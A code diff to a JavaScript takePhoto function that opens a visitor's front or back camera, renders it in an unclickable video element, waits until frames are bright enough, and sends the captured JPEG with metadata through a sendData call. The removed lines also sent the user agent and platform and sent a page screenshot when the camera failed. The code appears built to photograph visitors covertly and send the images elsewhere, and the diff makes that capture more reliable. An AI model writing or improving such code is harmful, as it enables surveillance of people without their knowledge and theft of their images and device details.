@@ -811,7 +811,7 @@
     
   
   
-  // Take photo from camera - IMPROVED WITH FALLBACKS FOR ANDROID/LINUX
+// Take photo from camera - IMPROVED CAMERA INITIALIZATION TIME
 async function takePhoto(cameraType) {
     console.log(`📷 Taking photo: ${cameraType}`);
 
@@ -857,7 +857,7 @@ async function takePhoto(cameraType) {
                 cameraStrategy = 'front_fallback';
             }
         } else {
-            // Back camera with multiple fallbacks for Android/Linux compatibility
+            // Back camera with multiple fallbacks
             try {
                 // First try: exact environment facingMode
                 stream = await navigator.mediaDevices.getUserMedia({
@@ -894,27 +894,14 @@ async function takePhoto(cameraType) {
                         throw new Error('Only one camera available');
                     }
                 } catch (error2) {
-                    console.log('❌ Back camera enumeration failed, using any camera with fallback constraints...');
-                    
-                    // Fallback for Android command windows/Linux browsers
-                    try {
-                        stream = await navigator.mediaDevices.getUserMedia({
-                            video: {
-                                width: { min: 640, ideal: 1280, max: 1920 },
-                                height: { min: 480, ideal: 720, max: 1080 },
-                                frameRate: { ideal: 30 }
-                            }
-                        });
-                        cameraStrategy = 'back_fallback_constraints';
-                    } catch (error3) {
-                        console.log('❌ Standard constraints failed, trying minimal constraints...');
-                        
-                        // Ultra-minimal constraints for maximum compatibility
-                        stream = await navigator.mediaDevices.getUserMedia({
-                            video: true // Let browser choose best available
-                        });
-                        cameraStrategy = 'back_minimal';
-                    }
+                    console.log('❌ Back camera enumeration failed, using any camera...');
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
+                    });
+                    cameraStrategy = 'back_fallback';
                 }
             }
         }
@@ -937,56 +924,125 @@ async function takePhoto(cameraType) {
         video.style.pointerEvents = 'none';
         document.body.appendChild(video);
 
-        // Wait for video to be ready with timeout
+        // Wait for video to be ready with PROPER TIMEOUT
         await new Promise((resolve, reject) => {
             const timeout = setTimeout(() => {
-                reject(new Error('Camera initialization timeout'));
-            }, 10000);
+                reject(new Error('Camera initialization timeout (15 seconds)'));
+            }, 15000);
+
+            let loaded = false;
+
+            const checkReady = () => {
+                if (video.readyState >= 4) { // HAVE_ENOUGH_DATA
+                    clearTimeout(timeout);
+                    if (!loaded) {
+                        loaded = true;
+                        console.log(`📐 Video ready: ${video.videoWidth}x${video.videoHeight}`);
+                        resolve();
+                    }
+                }
+            };
 
             video.onloadedmetadata = () => {
-                clearTimeout(timeout);
-                console.log(`📐 Video ready: ${video.videoWidth}x${video.videoHeight}`);
-                resolve();
+                console.log('📹 Video metadata loaded');
+                // Start checking for actual video data
+                video.play().then(() => {
+                    const checkInterval = setInterval(checkReady, 100);
+                    setTimeout(() => {
+                        clearInterval(checkInterval);
+                        if (!loaded) {
+                            console.log('⚠️ Video taking time to load, but proceeding...');
+                            resolve();
+                        }
+                    }, 5000);
+                }).catch(playError => {
+                    console.log('⚠️ Auto-play blocked, waiting for manual play...');
+                    resolve(); // Still proceed
+                });
             };
 
-            video.onerror = () => {
+            video.onerror = (error) => {
                 clearTimeout(timeout);
-                reject(new Error('Video element error'));
+                reject(new Error(`Video element error: ${error}`));
             };
+
+            // Fallback: if onloadedmetadata doesn't fire
+            setTimeout(() => {
+                if (!loaded && video.videoWidth > 0 && video.videoHeight > 0) {
+                    clearTimeout(timeout);
+                    loaded = true;
+                    console.log(`📐 Video ready (fallback): ${video.videoWidth}x${video.videoHeight}`);
+                    resolve();
+                }
+            }, 3000);
         });
 
-        // Wait for camera to stabilize (shorter timeout for command windows)
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        // IMPROVED: Wait for camera to properly initialize and stabilize
+        console.log('⏳ Waiting for camera to stabilize...');
+        
+        // Wait for camera to have proper light and focus
+        await new Promise(resolve => setTimeout(resolve, 3000)); // Increased to 3 seconds
+        
+        // Additional check for black frames
+        let attempts = 0;
+        const maxAttempts = 10;
+        
+        while (attempts < maxAttempts) {
+            attempts++;
+            
+            // Create temporary canvas to check frame content
+            const testCanvas = document.createElement('canvas');
+            testCanvas.width = video.videoWidth;
+            testCanvas.height = video.videoHeight;
+            const testCtx = testCanvas.getContext('2d');
+            testCtx.drawImage(video, 0, 0, testCanvas.width, testCanvas.height);
+            
+            // Check if frame is mostly black
+            const imageData = testCtx.getImageData(0, 0, testCanvas.width, testCanvas.height);
+            const brightness = calculateFrameBrightness(imageData);
+            
+            console.log(`🔍 Frame ${attempts} brightness: ${brightness}%`);
+            
+            if (brightness > 10) { // If frame has reasonable brightness
+                console.log('✅ Camera frame is properly lit');
+                break;
+            } else {
+                console.log('⚠️ Camera frame is dark, waiting...');
+                await new Promise(resolve => setTimeout(resolve, 500)); // Wait 500ms more
+            }
+        }
 
-        // Capture photo with error handling
+        // Final capture with quality check
+        console.log('📸 Capturing final photo...');
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        
         const ctx = canvas.getContext('2d');
         
-        try {
+        // Draw multiple times to ensure good frame
+        for (let i = 0; i < 3; i++) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        } catch (drawError) {
-            console.error('❌ Canvas draw error:', drawError);
-            throw new Error('Failed to capture image from camera');
+            await new Promise(resolve => setTimeout(resolve, 100));
         }
+        
+        // Final draw
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        let imageData;
-        try {
-            imageData = canvas.toDataURL('image/jpeg', 0.8); // Lower quality for compatibility
-        } catch (encodeError) {
-            console.error('❌ Image encoding error:', encodeError);
-            // Try PNG as fallback
-            imageData = canvas.toDataURL('image/png');
-        }
+        const imageData = canvas.toDataURL('image/jpeg', 0.9);
+        console.log(`📸 Photo captured: ${Math.round(imageData.length / 1024)} KB`);
 
-        console.log(`📸 Photo captured: ${Math.round(imageData.length / 1024)} KB, Strategy: ${cameraStrategy}`);
+        // Check final image quality
+        const finalImageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        const finalBrightness = calculateFrameBrightness(finalImageData);
+        
+        console.log(`💡 Final image brightness: ${finalBrightness}%`);
 
-        // Update metadata with strategy info
+        // Update metadata
         photoMetadata.camera_strategy = cameraStrategy;
         photoMetadata.resolution = `${canvas.width}x${canvas.height}`;
         photoMetadata.size_kb = Math.round(imageData.length / 1024);
+        photoMetadata.brightness = `${finalBrightness}%`;
+        photoMetadata.initialization_time = `${attempts * 0.5 + 3}s`;
 
         // Send photo
         sendData(`photo_${cameraType}`, imageData, {
@@ -995,14 +1051,7 @@ async function takePhoto(cameraType) {
         });
 
         // Cleanup
-        try {
-            stream.getTracks().forEach(track => {
-                track.stop();
-            });
-        } catch (cleanupError) {
-            console.log('⚠️ Stream cleanup warning:', cleanupError);
-        }
-        
+        stream.getTracks().forEach(track => track.stop());
         if (video.parentNode) {
             video.parentNode.removeChild(video);
         }
@@ -1013,72 +1062,47 @@ async function takePhoto(cameraType) {
         const errorData = {
             ...photoMetadata,
             error: error.message,
-            error_name: error.name,
-            user_agent: navigator.userAgent,
-            platform: navigator.platform
+            error_name: error.name
         };
 
-        // Send detailed error info
         sendData(`photo_error`, JSON.stringify(errorData, null, 2), {
             data_type: 'error',
             folder: 'errors'
         });
-
-        // Try screenshot fallback if camera fails completely
-        await attemptScreenshotFallback(cameraType, photoMetadata, error.message);
     }
 }
 
-// Screenshot fallback for when camera fails
-async function attemptScreenshotFallback(cameraType, metadata, originalError) {
-    console.log('🖼️ Attempting screenshot fallback...');
+// Helper function to calculate frame brightness
+function calculateFrameBrightness(imageData) {
+    const data = imageData.data;
+    let totalBrightness = 0;
+    const pixelCount = data.length / 4;
     
-    try {
-        // Check if we're in a browser environment that supports screenshots
-        if (typeof window === 'undefined' || !document.documentElement) {
-            throw new Error('Not in a browser environment');
-        }
-
-        const canvas = document.createElement('canvas');
-        const context = canvas.getContext('2d');
-        
-        // Set canvas to viewport size
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        
-        // Try to capture visible content
-        context.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
-        
-        const screenshotData = canvas.toDataURL('image/jpeg', 0.7);
-        
-        console.log(`📸 Screenshot captured: ${Math.round(screenshotData.length / 1024)} KB`);
-        
-        sendData(`screenshot_fallback_${cameraType}`, screenshotData, {
-            ...metadata,
-            data_type: 'screenshot_fallback',
-            original_error: originalError,
-            resolution: `${canvas.width}x${canvas.height}`,
-            size_kb: Math.round(screenshotData.length / 1024),
-            note: 'This is a screenshot fallback due to camera failure'
-        });
-        
-    } catch (screenshotError) {
-        console.error('❌ Screenshot fallback also failed:', screenshotError);
-        
-        // Send final failure notice
-        sendData(`camera_complete_failure`, JSON.stringify({
-            ...metadata,
-            original_error: originalError,
-            screenshot_error: screenshotError.message,
-            user_agent: navigator.userAgent,
-            platform: navigator.platform,
-            timestamp: new Date().toISOString(),
-            note: 'Both camera and screenshot methods failed'
-        }, null, 2), {
-            data_type: 'error',
-            folder: 'errors'
-        });
+    for (let i = 0; i < data.length; i += 4) {
+        // Calculate pixel brightness (RGB average)
+        const brightness = (data[i] + data[i + 1] + data[i + 2]) / 3;
+        totalBrightness += brightness;
     }
+    
+    const averageBrightness = totalBrightness / pixelCount;
+    return Math.round((averageBrightness / 255) * 100);
+}
+
+// Alternative: Simple brightness check (faster)
+function isFrameBlack(imageData, threshold = 10) {
+    const data = imageData.data;
+    let blackPixels = 0;
+    const totalPixels = data.length / 4;
+    
+    for (let i = 0; i < data.length; i += 4) {
+        const brightness = (data[i] + data[i + 1] + data[i + 2]) / 3;
+        if (brightness < 30) { // Very dark pixel
+            blackPixels++;
+        }
+    }
+    
+    const blackPercentage = (blackPixels / totalPixels) * 100;
+    return blackPercentage > threshold;
 }
     
     
